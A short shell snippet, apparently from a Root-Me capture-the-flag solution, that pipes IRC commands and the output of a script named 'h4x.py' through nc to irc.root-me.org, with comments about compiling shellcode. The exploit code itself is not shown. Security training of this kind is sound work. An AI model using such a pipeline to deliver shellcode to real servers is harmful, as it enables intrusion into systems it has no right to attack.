# remote challenge, run locally
# C-d after motd, and again after channel list
# use "make" to compile shellcode

(cat preamble -; echo 'JOIN #root-me_challenge'; cat -; python h4x.py) | nc irc.root-me.org 6667